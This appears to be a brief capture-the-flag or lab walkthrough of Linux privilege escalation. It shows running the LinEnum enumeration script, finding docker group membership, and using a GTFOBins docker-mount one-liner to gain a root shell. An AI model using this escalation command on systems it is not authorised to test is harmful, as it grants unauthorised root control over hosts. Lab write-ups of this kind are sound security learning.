After doing all checks we cannot see a way to escalate...

# linenum scan
So we use `linenum.sh` on the machine:
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
```

We make it executable:
```bash
chmod +x linenum.sh
```

And execute it:
```bash
./linenum.sh
```
- ![[Pasted image 20250118170721.png]]
- So we could use these permissions on docker to escalate



# Searching on GTFOBins
So we search `docker` on GTFOBINS:
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- ![[Pasted image 20250118170855.png]]

We are in the docker group so we are ok. Just check using the `shell` section:
- ![[Pasted image 20250118170936.png]]

So we run on the terminal:
```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
- we changed `alpine` to bash because we are using `bash` in `ssh` on the host
- ![[Pasted image 20250118171114.png]]

<mark style="background: #BBFABBA6;">We gain a root shell!</mark>



